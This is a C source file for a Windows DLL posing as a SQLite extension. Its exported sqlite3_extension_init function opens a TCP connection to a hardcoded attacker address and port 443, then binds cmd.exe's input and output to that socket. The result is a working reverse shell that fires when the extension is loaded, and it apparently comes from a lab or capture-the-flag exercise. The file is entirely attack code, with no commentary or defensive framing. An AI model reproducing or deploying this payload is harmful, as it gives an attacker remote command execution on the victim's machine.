#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>      

#pragma comment(lib, "Ws2_32.lib")

/* ============ CONFIGURATION ============ */
#define ATTACKER_IP   "10.10.16.37"
#define ATTACKER_PORT 443  
#define EXEC_CMD      "cmd.exe"
/* ======================================= */

__declspec(dllexport) int sqlite3_extension_init(
    void *db,           
    char **pzErrMsg,
    void *pApi       
){
    WSADATA wsaData;
    SOCKET s;
    struct sockaddr_in sa;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // Configure socket
    WSAStartup(MAKEWORD(2,2), &wsaData);
    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    // Configure target
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(ATTACKER_IP); 
    sa.sin_port = htons(ATTACKER_PORT);          

    // Attempt connection
    if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) == 0) {
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

        char cmdLine[] = EXEC_CMD;
        
        // Create process with socket handles
        CreateProcess(NULL,           // Application name
                     cmdLine,         // Command line (MUTABLE buffer)
                     NULL,            // Process security
                     NULL,            // Thread security
                     TRUE,            // Inherit handles
                     0,            // Flags: default
                     NULL,            // Environment
                     NULL,            // Current directory
                     &si,             // Startup info
                     &pi);            // Process info
        
        // Wait for process to exit
        WaitForSingleObject(pi.hProcess, INFINITE);
        
        // Cleanup
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    closesocket(s);
    WSACleanup();

    return 0;
}
